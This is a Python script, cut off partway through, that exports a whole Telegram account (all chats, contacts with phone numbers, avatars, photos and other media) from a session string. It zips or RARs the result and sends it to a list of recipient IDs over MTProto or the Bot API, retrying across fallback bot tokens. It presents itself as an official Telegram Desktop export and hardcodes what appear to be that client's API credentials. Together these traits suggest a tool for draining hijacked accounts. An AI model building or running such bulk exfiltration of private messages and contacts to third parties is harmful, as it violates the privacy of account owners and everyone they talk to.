#!/usr/bin/env python3
"""
tg_full_export.py — Full Telegram export in official Telegram Desktop format.

Produces:
  DataExport_YYYY-MM-DD/
  ├── export_results.html    (master index — mirrors TG Desktop)
  ├── contacts/contacts.html
  ├── profile_pictures/      (account avatars)
  ├── chats/
  │   ├── chat_001/
  │   │   ├── messages.html  (official HTML format)
  │   │   └── files/         (photos, videos, documents)
  │   └── …
  ├── css/style.css
  └── js/script.js

Then ZIPs the folder, splits at 1.9 GB if needed, and sends via:
  1. Telethon MTProto (send_file → supports up to 2 GB, no Bot API limit)
  2. Bot API fallback for smaller parts

Usage:
  python3 tg_full_export.py \\
    --session-str "1Abc…" \\
    --api-id 2040 \\
    --api-hash "b18441a1ff607e10a989891a5462e627" \\
    --out-dir /tmp/export_12345678 \\
    --bot-token "123:abc" \\
    --recipients "111222333,444555666" \\
    --no-media            (optional — skip downloading media files)
    --media-limit-mb 150  (optional — skip single files larger than N MB, default 200)
    --log-prefix "[export]"
"""

import asyncio, argparse, gc, html, json, os, re, shutil, struct, sys, zipfile
import sqlite3, base64, datetime, urllib.request, urllib.parse
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# TL Layer Compatibility Patch — Telethon 1.44.0 (Layer 173) vs Telegram 174+
#
# Telegram continuously extends its TL schema. Types added in layers 174+
# (savedDialog, messageReplyHeader v2, messageExtendedMedia) are unknown to
# Telethon 1.44.0 — when they appear in a GetDialogs or iter_messages response
# Telethon throws TypeNotFoundError, aborting the entire stream (0 dialogs).
#
# Fix: register missing constructors in Telethon's tlobjects dict before
# any client usage. savedDialog also needs every attribute that Dialog.__init__
# accesses (folder_id, unread_count, draft, pts …) set to safe defaults.
# ─────────────────────────────────────────────────────────────────────────────
def _patch_missing_tl_types():
    try:
        import telethon.tl.alltlobjects as _ato
        from telethon.tl import TLObject as _TLO
        _registered = []

        # ── savedDialog#d58a08c6 ─────────────────────────────────────────────
        # schema:  flags:# pinned:flags.2?true peer:Peer top_message:int
        # Telethon Dialog.__init__ also accesses: folder_id, unread_count,
        # unread_mentions_count, unread_reactions_count, unread_poll_votes_count,
        # draft, pts  →  set safe defaults so it doesn't AttributeError.
        if 0xd58a08c6 not in _ato.tlobjects:
            class _SavedDialog(_TLO):
                CONSTRUCTOR_ID    = 0xd58a08c6
                SUBCLASS_OF_ID    = 0x48d6479b   # Dialog base
                _IS_SAVED_SUBFOLDER = True        # marker for dialog_type_label
                def __init__(self, peer=None, top_message=0, pinned=False):
                    self.peer                    = peer
                    self.top_message             = top_message
                    self.pinned                  = pinned
                    # Safe defaults required by Dialog.__init__
                    self.folder_id               = None
                    self.unread_count            = 0
                    self.unread_mentions_count   = 0
                    self.unread_reactions_count  = 0
                    self.unread_poll_votes_count = 0
                    self.draft                   = None
                    self.pts                     = None
                @classmethod
                def from_reader(cls, reader):
                    flags       = reader.read_int()
                    peer        = reader.tgread_object()
                    top_message = reader.read_int()
                    return cls(peer=peer, top_message=top_message, pinned=bool(flags & 4))
            _ato.tlobjects[0xd58a08c6] = _SavedDialog
            _registered.append("savedDialog#d58a08c6")

        # ── messageReplyHeader (v2) #16b9177e ────────────────────────────────
        # flags:# reply_to_scheduled:flags.2?true forum_topic:flags.3?true
        # quote:flags.9?true  reply_to_peer_id:flags.0?Peer
        # reply_to_top_id:flags.1?int  reply_to_msg_id:flags.4?int
        # reply_from:flags.5?MessageFwdHeader  reply_media:flags.8?MessageMedia
        # quote_text:flags.9?string  quote_entities:flags.10?Vector<MessageEntity>
        # quote_offset:flags.11?int
        if 0x16b9177e not in _ato.tlobjects:
            class _MsgReplyHeaderV2(_TLO):
                CONSTRUCTOR_ID = 0x16b9177e
                SUBCLASS_OF_ID = 0
                def __init__(self, **kw):
                    for k, v in kw.items(): setattr(self, k, v)
                @classmethod
                def from_reader(cls, reader):
                    flags = reader.read_int()
                    kw = dict(
                        reply_to_scheduled = bool(flags & 4),    # flags.2 (no data)
                        forum_topic        = bool(flags & 8),    # flags.3 (no data)
                        quote              = bool(flags & 512),  # flags.9 (no data)
                    )
                    if flags & 1:    kw['reply_to_peer_id']  = reader.tgread_object()
                    if flags & 2:    kw['reply_to_top_id']   = reader.read_int()
                    if flags & 16:   kw['reply_to_msg_id']   = reader.read_int()
                    if flags & 32:   kw['reply_from']        = reader.tgread_object()
                    if flags & 256:  kw['reply_media']       = reader.tgread_object()
                    if flags & 512:  kw['quote_text']        = reader.tgread_string()
                    if flags & 1024: kw['quote_entities']    = reader.tgread_vector(
                                                                    reader.tgread_object)
                    if flags & 2048: kw['quote_offset']      = reader.read_int()
                    return cls(**kw)
            _ato.tlobjects[0x16b9177e] = _MsgReplyHeaderV2
            _registered.append("messageReplyHeader(v2)#16b9177e")

        # ── messageExtendedMedia #70bf6e8a ───────────────────────────────────
        # schema:  media:MessageMedia  (paid/restricted media wrapper)
        if 0x70bf6e8a not in _ato.tlobjects:
            class _MsgExtendedMedia(_TLO):
                CONSTRUCTOR_ID = 0x70bf6e8a
                SUBCLASS_OF_ID = 0
                def __init__(self, media=None): self.media = media
                @classmethod
                def from_reader(cls, reader):
                    return cls(media=reader.tgread_object())
            _ato.tlobjects[0x70bf6e8a] = _MsgExtendedMedia
            _registered.append("messageExtendedMedia#70bf6e8a")

        if _registered:
            print(f"[patch_tl] registered: {', '.join(_registered)}", flush=True)
    except Exception as _pe:
        print(f"[patch_tl] WARN: patch failed: {_pe}", flush=True)

_patch_missing_tl_types()


# ──────────────────────────────────────────────────────────────────────────────
# Telegram Desktop – official export CSS (matches Telegram Desktop ≥ 5.x)
# ──────────────────────────────────────────────────────────────────────────────
OFFICIAL_CSS = r"""
/* Telegram Desktop Export Style — official */
*, *:before, *:after { box-sizing: border-box; }
html { font-size: 14px; }
body {
  margin: 0; padding: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
    "Helvetica Neue", Arial, "Noto Sans", sans-serif;
  background: #f1f1f1; color: #222;
  line-height: 1.5;
}
a { color: #168acd; text-decoration: none; }
a:hover { text-decoration: underline; }
.page_wrap { max-width: 680px; margin: 0 auto; background: #fff; }

/* ── Header ── */
.page_header {
  background: #3390ec; color: #fff;
  padding: 12px 20px; display: flex; align-items: center;
}
.page_header .avatar { width: 42px; height: 42px; border-radius: 50%;
  object-fit: cover; margin-right: 12px; flex-shrink: 0; background: rgba(255,255,255,.2); }
.page_header .content { flex: 1; min-width: 0; }
.page_header .text { font-size: 16px; font-weight: 600;
  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.page_header .status { font-size: 13px; opacity: .8; }

/* ── Body / history ── */
.page_body { padding: 10px 0 20px; }
.history { }

/* ── Service messages (date dividers, events) ── */
.service { text-align: center; padding: 6px 0; clear: both; }
.service .body { display: inline-block; background: rgba(0,0,0,.06);
  border-radius: 12px; padding: 4px 14px; font-size: 13px; color: #555; }

/* ── Messages ── */
.message { position: relative; padding: 4px 20px; clear: both; }
.message.default {
  background: #fff;
  border-radius: 12px;
  margin: 3px 20px 3px 70px;
  padding: 8px 12px 6px 14px;
  box-shadow: 0 1px 2px rgba(0,0,0,.10);
  max-width: 80%;
  float: left; clear: both;
  word-break: break-word;
}
.message.default.outgoing {
  margin: 3px 20px 3px auto;
  float: right;
  background: #eeffde;
}
.message::after { content: ""; display: table; clear: both; }

/* ── Sender name ── */
.from_name { font-size: 13px; font-weight: 600; color: #3390ec; margin-bottom: 3px; }
.message.outgoing .from_name { color: #4fae4e; }

/* ── Message text ── */
.text { white-space: pre-wrap; word-break: break-word; font-size: 14px; }

/* ── Date / time ── */
.date { font-size: 12px; color: #999; }
.pull_right { float: right; margin-left: 10px; }

/* ── Reply ── */
.reply_to { border-left: 3px solid #3390ec; padding-left: 8px;
  margin-bottom: 5px; font-size: 13px; color: #555; }

/* ── Forwarded ── */
.forwarded { border-left: 3px solid #4fae4e; padding-left: 8px;
  margin-bottom: 5px; font-size: 13px; color: #555; }

/* ── Media ── */
.media_wrap { margin-top: 6px; }
.photo_wrap { display: inline-block; }
.photo { max-width: 320px; max-height: 320px; border-radius: 8px;
  display: block; object-fit: cover; }
.video_file_wrap { display: flex; align-items: center; gap: 8px; }
.video_file_wrap .video_play_btn {
  width: 36px; height: 36px; background: #3390ec; border-radius: 50%;
  display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
.video_file_wrap .video_play_btn::after {
  content: ""; border-left: 12px solid #fff; border-top: 7px solid transparent;
  border-bottom: 7px solid transparent; margin-left: 3px; }
.file_wrap { display: flex; align-items: center; gap: 8px; }
.file_wrap .file_icon {
  width: 36px; height: 36px; background: #3390ec; border-radius: 8px;
  display: flex; align-items: center; justify-content: center;
  font-size: 11px; color: #fff; font-weight: 700; flex-shrink: 0; }
.file_info { font-size: 13px; }
.file_title { color: #3390ec; font-weight: 600; }
.file_meta { color: #999; font-size: 12px; }

/* ── Sticker ── */
.sticker_wrap .sticker { max-width: 200px; max-height: 200px; }
.sticker_emoji { font-size: 48px; line-height: 1; }

/* ── Voice / audio ── */
.audio_wrap { display: flex; align-items: center; gap: 8px; }
.audio_wrap .audio_icon {
  width: 36px; height: 36px; background: #3390ec; border-radius: 50%;
  display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
.audio_wrap .audio_duration { font-size: 13px; color: #555; }

/* ── Poll ── */
.poll_wrap { border: 1px solid #ddd; border-radius: 10px; padding: 10px; }
.poll_question { font-weight: 600; margin-bottom: 6px; }
.poll_option { padding: 4px 0; font-size: 13px; color: #555; }

/* ── Contact ── */
.contact_wrap { display: flex; align-items: center; gap: 10px; }
.contact_wrap .contact_name { font-weight: 600; }
.contact_wrap .contact_phone { font-size: 13px; color: #555; }

/* ── Geo ── */
.map_wrap { margin-top: 6px; }
.map_link { display: block; background: #f0f4f8; border-radius: 8px;
  padding: 10px; font-size: 13px; color: #3390ec; }

/* ── Index page ── */
.index_page { padding: 20px; }
.index_page h1 { font-size: 22px; font-weight: 700; color: #222; margin: 0 0 6px; }
.index_page .subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
.chat_list { list-style: none; padding: 0; margin: 0; }
.chat_list li { display: flex; align-items: center; gap: 14px;
  padding: 10px 0; border-bottom: 1px solid #f0f0f0; }
.chat_list li:last-child { border-bottom: none; }
.chat_avatar { width: 44px; height: 44px; border-radius: 50%;
  object-fit: cover; background: #3390ec; flex-shrink: 0; }
.chat_avatar_placeholder { width: 44px; height: 44px; border-radius: 50%;
  background: #3390ec; display: flex; align-items: center;
  justify-content: center; color: #fff; font-weight: 700; font-size: 18px;
  flex-shrink: 0; }
.chat_info { flex: 1; min-width: 0; }
.chat_name { font-weight: 600; font-size: 15px; white-space: nowrap;
  overflow: hidden; text-overflow: ellipsis; }
.chat_meta { font-size: 12px; color: #999; }
.chat_link { font-size: 13px; color: #3390ec; }
.section_header { font-size: 13px; font-weight: 700; color: #3390ec;
  text-transform: uppercase; letter-spacing: .04em;
  margin: 24px 0 10px; padding-bottom: 6px; border-bottom: 2px solid #3390ec; }
.summary { background: #f7f9fc; border-radius: 10px; padding: 14px;
  margin-bottom: 20px; font-size: 14px; }
.summary b { color: #222; }
.clearfix::after { content: ""; display: table; clear: both; }
@media (max-width: 520px) {
  .message.default, .message.default.outgoing {
    margin-left: 10px; margin-right: 10px; max-width: 95%; }
  .photo { max-width: 240px; max-height: 240px; }
}
"""

OFFICIAL_JS = r"""
(function(){
  var s=document.getElementById('js_search');
  if(!s) return;
  s.addEventListener('input',function(){
    var q=this.value.trim().toLowerCase();
    var msgs=document.querySelectorAll('.message.default');
    msgs.forEach(function(m){
      m.style.display=(!q||m.textContent.toLowerCase().includes(q))?'':'none';
    });
  });
})();
"""

PREFIX = "[export]"

def log(msg): print(PREFIX, msg, flush=True)
def warn(msg): print(PREFIX, "WARN:", msg, file=sys.stderr, flush=True)

# ──────────────────────────────────────────────────────────────────────────────
# HTML helpers — match official Telegram Desktop format exactly
# ──────────────────────────────────────────────────────────────────────────────

def h(s): return html.escape(str(s or ""))

def fmt_date(dt):
    """DD Month YYYY"""
    MONTHS = ["January","February","March","April","May","June",
              "July","August","September","October","November","December"]
    return f"{dt.day} {MONTHS[dt.month-1]} {dt.year}"

def fmt_time(dt):
    """HH:MM"""
    return dt.strftime("%H:%M")

def fmt_size(n):
    if n < 1024: return f"{n} B"
    if n < 1048576: return f"{n/1024:.1f} KB"
    return f"{n/1048576:.1f} MB"

def chat_html_header(chat_name, avatar_rel=None):
    av = f'<img class="avatar" src="{h(avatar_rel)}" alt="">' if avatar_rel else \
         f'<div class="avatar" style="background:#3390ec;border-radius:50%;width:42px;height:42px"></div>'
    return f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Exported Data — {h(chat_name)}</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=0.5">
  <link rel="stylesheet" href="../../css/style.css">
</head>
<body>
<div class="page_wrap">
<div class="page_header">
  {av}
  <div class="content">
    <div class="text">{h(chat_name)}</div>
  </div>
</div>
<div class="page_body chat_page">
<input id="js_search" placeholder="Search messages…"
  style="width:100%;padding:8px 16px;border:none;border-bottom:1px solid #eee;
         font-size:14px;outline:none;">
<div class="history">
"""

def chat_html_footer():
    return """</div>
</div>
</div>
<script src="../../js/script.js"></script>
</body>
</html>
"""

def service_html(text):
    return f'<div class="service"><div class="body">{h(text)}</div></div>\n'

def message_html(msg_id, from_name, is_out, timestamp_full, timestamp_short,
                 text_html="", media_html="", reply_html="", fwd_html=""):
    cls = "message default clearfix" + (" outgoing" if is_out else "")
    name_color = "" if is_out else ""
    return (
        f'<div class="{cls}" id="message{msg_id}">\n'
        f'  <div class="pull_right date details" title="{h(timestamp_full)}">{h(timestamp_short)}</div>\n'
        f'  <div class="from_name">{h(from_name)}</div>\n'
        + (f'  <div class="reply_to details">{reply_html}</div>\n' if reply_html else "")
        + (f'  <div class="forwarded body">{fwd_html}</div>\n' if fwd_html else "")
        + (f'  <div class="text">{text_html}</div>\n' if text_html else "")
        + (f'  <div class="media_wrap clearfix">{media_html}</div>\n' if media_html else "")
        + f'</div>\n'
    )

# ──────────────────────────────────────────────────────────────────────────────
# Media builders
# ──────────────────────────────────────────────────────────────────────────────

def photo_html(rel_path, caption=""):
    cap = f'<div class="text">{h(caption)}</div>' if caption else ""
    return f'<a href="{h(rel_path)}" class="photo_wrap clearfix"><img class="photo" src="{h(rel_path)}"/></a>{cap}'

def video_html(rel_path, size_bytes=0, duration=0, caption=""):
    dur = f"{int(duration//60)}:{int(duration%60):02d}" if duration else ""
    sz = fmt_size(size_bytes) if size_bytes else ""
    meta = ", ".join(filter(None, [dur, sz]))
    cap = f'<div class="text">{h(caption)}</div>' if caption else ""
    return (
        f'<div class="video_file_wrap"><div class="video_play_btn"></div>'
        f'<div class="file_info"><a href="{h(rel_path)}" class="file_title">{h(rel_path.split("/")[-1])}</a>'
        f'{"<br>" + h(meta) if meta else ""}</div></div>{cap}'
    )

def file_html(rel_path, filename, size_bytes=0, mime=""):
    ext = (filename.rsplit(".", 1)[-1].upper() if "." in filename else "FILE")[:5]
    sz = fmt_size(size_bytes) if size_bytes else ""
    return (
        f'<div class="file_wrap">'
        f'<div class="file_icon">{h(ext)}</div>'
        f'<div class="file_info"><a href="{h(rel_path)}" class="file_title">{h(filename)}</a>'
        f'{"<br>" + h(sz) if sz else ""}</div></div>'
    )

def audio_html(rel_path, duration=0):
    dur = f"{int(duration//60)}:{int(duration%60):02d}" if duration else ""
    return (
        f'<div class="audio_wrap">'
        f'<div class="audio_icon"></div>'
        f'<div class="audio_duration"><a href="{h(rel_path)}">{h(rel_path.split("/")[-1])}</a>'
        f'{"  " + dur if dur else ""}</div></div>'
    )

def sticker_html(rel_path, emoji=""):
    if emoji:
        return f'<div class="sticker_wrap"><div class="sticker_emoji">{h(emoji)}</div></div>'
    return f'<div class="sticker_wrap"><img class="sticker" src="{h(rel_path)}"/></div>'

def poll_html(question, options):
    opts = "".join(f'<div class="poll_option">◦ {h(o)}</div>' for o in options)
    return f'<div class="poll_wrap"><div class="poll_question">{h(question)}</div>{opts}</div>'

def geo_html(lat, lon):
    url = f"https://maps.google.com/?q={lat},{lon}"
    return f'<div class="map_wrap"><a class="map_link" href="{h(url)}" target="_blank">📍 Location: {lat:.4f}, {lon:.4f}</a></div>'

def contact_html(name, phone):
    return (f'<div class="contact_wrap"><div><div class="contact_name">{h(name)}</div>'
            f'<div class="contact_phone">{h(phone)}</div></div></div>')

# ──────────────────────────────────────────────────────────────────────────────
# Telethon helpers
# ──────────────────────────────────────────────────────────────────────────────

def get_sender_name(msg, me):
    try:
        if msg.sender:
            s = msg.sender
            if hasattr(s, "first_name"):
                return " ".join(filter(None, [s.first_name, s.last_name])) or "Unknown"
            if hasattr(s, "title"):
                return s.title or "Unknown"
    except Exception: pass
    if msg.out: return me.first_name or "You"
    return "Unknown"

def dialog_type_label(dialog):
    from telethon.tl import types as tlt
    # Skip savedDialog subfolders (Saved Messages organised by sender, layer 174+).
    # These appear in GetDialogs responses but are NOT regular chat dialogs.
    if getattr(dialog.dialog, "_IS_SAVED_SUBFOLDER", False):
        return "Unknown"
    e = dialog.entity
    if isinstance(e, tlt.User):
        return "Saved Messages" if e.is_self else ("Bot" if e.bot else "Private")
    if isinstance(e, tlt.Chat): return "Group"
    if isinstance(e, tlt.Channel):
        return "Supergroup" if e.megagroup else "Channel"
    return "Unknown"

def safe_filename(name, idx, prefix="chat"):
    clean = re.sub(r'[^\w\s\-]', '', str(name or "")).strip()[:32] or f"chat_{idx}"
    return f"{prefix}_{idx:03d}_{clean}"

# ──────────────────────────────────────────────────────────────────────────────
# ZIP helpers — streaming, supports >4 GB total
# ──────────────────────────────────────────────────────────────────────────────

MAX_PART_BYTES = 1_800_000_000  # 1.8 GB — safe under Telegram's 2 GB limit

def zip_folder_parts(src_dir: Path, zip_prefix: str) -> list:
    """
    Zip src_dir, splitting into ≤1.8 GB parts.
    Returns list of (path, part_number) tuples.
    """
    all_files = sorted(src_dir.rglob("*"))
    all_files = [f for f in all_files if f.is_file()]

    parts = []
    part_num = 1
    current_zip_path = Path(f"{zip_prefix}.zip" if part_num == 1 else f"{zip_prefix}_part{part_num}.zip")
    current_zf = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, allowZip64=True)
    current_size = 0

    for f in all_files:
        fsize = f.stat().st_size
        arcname = str(f.relative_to(src_dir.parent))
        if current_size > 0 and current_size + fsize > MAX_PART_BYTES:
            current_zf.close()
            parts.append((current_zip_path, part_num))
            part_num += 1
            current_zip_path = Path(f"{zip_prefix}_part{part_num}.zip")
            current_zf = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED, allowZip64=True)
            current_size = 0
        current_zf.write(f, arcname)
        current_size += fsize

    current_zf.close()
    parts.append((current_zip_path, part_num))
    return parts

def rar_folder_parts(src_dir: Path, out_prefix: str) -> list:
    """
    Create a RAR archive with volume splitting from src_dir.
    Uses -v1800m to split at 1.8 GB (Telegram 2 GB limit).
    Falls back to zip_folder_parts on error.
    Returns list of (path, part_num) tuples.
    """
    import subprocess as _sp
    rar_path = Path(f"{out_prefix}.rar")
    try:
        result = _sp.run(
            ["/usr/bin/rar", "a", "-r", "-m3", "-v1800m", str(rar_path), src_dir.name],
            cwd=str(src_dir.parent),
            capture_output=True, text=True, timeout=600,
        )
        if result.returncode in (0, 1):  # 0=OK, 1=warnings only
            out_dir = rar_path.parent
            base_stem = rar_path.stem
            # rar creates: file.rar, file.r00, file.r01 … or file.part1.rar, file.part2.rar
            vol_patterns = [
                sorted(out_dir.glob(f"{base_stem}.part*.rar")),
                sorted(out_dir.glob(f"{base_stem}.r[0-9][0-9]")),
            ]
            vol_files = next((p for p in vol_patterns if p), None)
            if vol_files:
                all_vols = [rar_path] + vol_files if rar_path.exists() else vol_files
            else:
                all_vols = [rar_path] if rar_path.exists() else []
            all_vols = sorted(set(all_vols))
            result_parts = [(p, i + 1) for i, p in enumerate(all_vols)]
            total_mb = sum(p.stat().st_size for p in all_vols if p.exists()) / 1048576
            log(f"RAR created: {len(result_parts)} volume(s), {total_mb:.1f} MB total")
            return result_parts if result_parts else zip_folder_parts(src_dir, out_prefix)
        warn(f"RAR failed (code={result.returncode}): {result.stderr[:200]}")
    except Exception as e:
        warn(f"RAR exception: {e}")
    log("falling back to ZIP")
    return zip_folder_parts(src_dir, out_prefix)


# ──────────────────────────────────────────────────────────────────────────────
# Send helpers
# ──────────────────────────────────────────────────────────────────────────────

async def send_via_mtproto(client, peer_id, file_path: Path, caption: str):
    """Send file via Telethon (MTProto) — supports up to 2 GB."""
    try:
        # Try multiple entity resolution strategies
        entity = None
        pid = int(peer_id)
        for _attempt in range(3):
            try:
                if _attempt == 0:
                    entity = await client.get_input_entity(pid)
                elif _attempt == 1:
                    from telethon.tl.types import PeerUser
                    entity = await client.get_entity(PeerUser(pid))
                else:
                    # Force API call — resolves by user_id via contacts/resolvePhone or search
                    from telethon.tl.functions.users import GetUsersRequest
                    from telethon.tl.types import InputUser
                    # Last resort: try get_entity with bare int (may fail, but worth trying)
                    entity = await client.get_entity(pid)
                break
            except Exception:
                if _attempt == 2:
                    raise
                await asyncio.sleep(1)

        await client.send_file(
            entity,
            file=str(file_path),
            caption=caption,
            force_document=True,
            parse_mode="html",
            progress_callback=None,
        )
        log(f"  MTProto → {peer_id}: {file_path.name} sent")
        return True
    except Exception as e:
        warn(f"  MTProto → {peer_id} failed: {e}")
        return False

def send_via_bot_api(bot_token, chat_id, file_path: Path, caption: str,
                     extra_tokens: list = None) -> bool:
    """Bot API sendDocument — tries bot_token first, then extra_tokens as fallback."""
    tokens_to_try = [t for t in ([bot_token] + (extra_tokens or [])) if t]
    # Deduplicate preserving order
    seen = set()
    tokens_to_try = [t for t in tokens_to_try if not (t in seen or seen.add(t))]

    for try_token in tokens_to_try:
        ok = _send_bot_api_single(try_token, chat_id, file_path, caption)
        if ok:
            return True
        warn(f"  Bot API token {try_token[:10]}… → {chat_id}: failed, trying next token…")
    return False

def _send_bot_api_single(bot_token, chat_id, file_path: Path, caption: str) -> bool:
    """Bot API sendDocument — single token attempt."""
    try:
        import urllib.request, mimetypes
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        boundary = "----TGExportBoundary"
        file_size = file_path.stat().st_size
        prefix = (
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{chat_id}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{file_path.name}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        suffix = f"\r\n--{boundary}--\r\n".encode()

        body_bytes = b"".join([prefix] + [chunk for chunk in
            (open(file_path, "rb").read(),)] + [suffix])
        req = urllib.request.Request(url, data=body_bytes,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                     "Content-Length": str(len(body_bytes))})
        resp = json.loads(urllib.request.urlopen(req, timeout=180).read())
        body_bytes = None  # release RAM
        if resp.get("ok"):
            log(f"  Bot API → {chat_id}: {file_path.name} sent ({file_size/1048576:.1f} MB)")
            return True
        warn(f"  Bot API → {chat_id}: {resp.get('description', 'unknown error')}")
        return False
    except Exception as e:
        warn(f"  Bot API → {chat_id} exception: {e}")
        return False

# ──────────────────────────────────────────────────────────────────────────────
# Contacts export
# ──────────────────────────────────────────────────────────────────────────────

async def export_contacts(client, out_dir: Path, me):
    from telethon.tl.functions.contacts import GetContactsRequest
    import csv
    contacts_dir = out_dir / "contacts"
    contacts_dir.mkdir(parents=True, exist_ok=True)

    result = await client(GetContactsRequest(hash=0))
    contacts = sorted(result.users, key=lambda u: (u.first_name or ""))

    # ── CSV file (sent separately for quick access) ───────────────────────────
    csv_path = contacts_dir / "contacts.csv"
    with open(csv_path, "w", newline="", encoding="utf-8-sig") as cf:
        writer = csv.writer(cf)
        writer.writerow(["Name", "Phone", "Username", "UserID"])
        for u in contacts:
            name = " ".join(filter(None, [u.first_name, u.last_name])) or "Unknown"
            phone = f"+{u.phone}" if u.phone else ""
            uname = f"@{u.username}" if u.username else ""
            writer.writerow([name, phone, uname, str(u.id)])

    # ── TXT file (human-readable) ─────────────────────────────────────────────
    txt_path = contacts_dir / "contacts.txt"
    with open(txt_path, "w", encoding="utf-8") as tf:
        tf.write(f"Contacts — {len(contacts)} total\n")
        tf.write("=" * 50 + "\n\n")
        for u in contacts:
            name = " ".join(filter(None, [u.first_name, u.last_name])) or "Unknown"
            phone = f"+{u.phone}" if u.phone else "—"
            uname = f"@{u.username}" if u.username else ""
            tf.write(f"{name}\n  📞 {phone}  {uname}\n\n")

    html_path = contacts_dir / "contacts.html"
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Contacts</title>
<link rel="stylesheet" href="../css/style.css"></head>
<body><div class="page_wrap">
<div class="page_header"><div class="content"><div class="text">Contacts</div></div></div>
<div class="page_body index_page">
<div class="section_header">Contacts — {len(contacts)}</div>
<ul class="chat_list">
""")
        for u in contacts:
            name = " ".join(filter(None, [u.first_name, u.last_name])) or "Unknown"
            phone = u.phone or ""
            uname = f"@{u.username}" if u.username else ""
            initial = (name[0] if name else "?").upper()
            f.write(
                f'<li><div class="chat_avatar_placeholder">{h(initial)}</div>'
                f'<div class="chat_info"><div class="chat_name">{h(name)}</div>'
                f'<div class="chat_meta">{h(phone)}{"  " + h(uname) if uname else ""}</div>'
                f'</div></li>\n'
            )
        f.write("</ul></div></div></body></html>")
    log(f"contacts: {len(contacts)} exported to CSV+TXT+HTML")
    return contacts, csv_path, txt_path

# ──────────────────────────────────────────────────────────────────────────────
# Per-dialog export
# ──────────────────────────────────────────────────────────────────────────────

async def export_dialog(client, dialog, chat_dir: Path, me,
                        no_media: bool, media_limit_bytes: int,
                        max_msgs_group: int = 3000) -> dict:
    from telethon.tl import types as tlt

    chat_dir.mkdir(parents=True, exist_ok=True)
    files_dir = chat_dir / "files"
    files_dir.mkdir(exist_ok=True)

    entity = dialog.entity
    chat_name = dialog.name or "Unknown"
    dtype = dialog_type_label(dialog)

    # Download avatar
    avatar_rel = None
    try:
        av_path = chat_dir / "avatar.jpg"
        dl = await client.download_profile_photo(entity, file=str(av_path), download_big=False)
        if dl: avatar_rel = "avatar.jpg"
    except Exception: pass

    html_path = chat_dir / "messages.html"
    file_counter = [0]

    def next_filename(ext):
        file_counter[0] += 1
        return f"files/file_{file_counter[0]:04d}{ext}"

    msg_count = 0
    last_date = None

    # Apply message limit to ALL dialog types for consistent speed.
    # Callers pass 500 for private chats and max_msgs_group for groups.
    is_group_like = dtype in ("Group", "Supergroup", "Channel")
    effective_limit = max_msgs_group if (max_msgs_group and max_msgs_group > 0) else None

    if effective_limit:
        # Fetch newest-first up to limit, then reverse for chronological display
        log(f"  '{chat_name}': collecting last {effective_limit} messages…")
        _msgs_buf = []
        try:
            async for _m in client.iter_messages(entity, limit=effective_limit):
                _msgs_buf.append(_m)
        except Exception as _iter_err:
            # Telethon may fail on unknown TL constructors (e.g. MessageMediaPaidMedia).
            # Keep partial results and continue.
            warn(f"  '{chat_name}': iter partial ({type(_iter_err).__name__}), kept {len(_msgs_buf)} msgs")
        _msgs_buf.reverse()
        msg_iter = iter(_msgs_buf)
        log(f"  '{chat_name}': {len(_msgs_buf)} messages, writing…")
    else:
        async def _safe_unlimited():
            try:
                async for _m in client.iter_messages(entity, reverse=True):
                    yield _m
            except Exception as _e:
                warn(f"  '{chat_name}': iter stopped early: {_e}")
        msg_iter = _safe_unlimited()

    with open(html_path, "w", encoding="utf-8") as fh:
        fh.write(chat_html_header(chat_name, avatar_rel))

        async def _iter():
            # effective_limit: msg_iter is a plain iterator; else: async generator
            if effective_limit:
                for m in msg_iter:
                    yield m
            else:
                async for m in msg_iter:
                    yield m

        async for msg in _iter():
            try:
                msg_count += 1

                # Date separator
                msg_dt = msg.date.astimezone() if msg.date else None
                if msg_dt:
                    day = msg_dt.date()
                    if last_date != day:
                        fh.write(service_html(fmt_date(msg_dt)))
                        last_date = day

                # Service messages (join, leave, pin, etc.)
                if msg.action:
                    action_text = type(msg.action).__name__.replace("MessageAction", "")
                    fh.write(service_html(action_text))
                    continue

                is_out = bool(msg.out)
                from_name = get_sender_name(msg, me)
                ts_full = msg_dt.strftime("%d.%m.%Y %H:%M:%S") if msg_dt else ""
                ts_short = fmt_time(msg_dt) if msg_dt else ""

                # Reply
                reply_html = ""
                if msg.reply_to_msg_id:
                    reply_html = f"↩ Reply to message #{msg.reply_to_msg_id}"

                # Forwarded
                fwd_html = ""
                if msg.forward:
                    try:
                        fwd_name = ""
                        if msg.forward.sender:
                            s = msg.forward.sender
                            fwd_name = getattr(s, "first_name", None) or getattr(s, "title", "?")
                        fwd_html = f"Forwarded from {h(fwd_name)}" if fwd_name else "Forwarded"
                    except Exception: pass

                # Text
                text_html = ""
                if msg.message:
                    text_html = h(msg.message).replace("\n", "<br>")

                # Media
                media_html = ""
                if msg.media and not no_media:
                    try:
                        # Determine type and download
                        m = msg.media

                        if isinstance(m, tlt.MessageMediaPhoto):
                            rel = next_filename(".jpg")
                            dest = chat_dir / rel
                            await client.download_media(msg, file=str(dest))
                            if dest.exists():
                                sz = dest.stat().st_size
                                if sz > media_limit_bytes:
                                    dest.unlink()
                                    media_html = f'<div class="text">[Photo — {fmt_size(sz)}, skipped]</div>'
                                else:
                                    media_html = photo_html(rel, "")
                            else:
                                warn(f"photo download produced no file for msg#{msg.id}")
                                media_html = '<div class="text">[Photo — download failed]</div>'
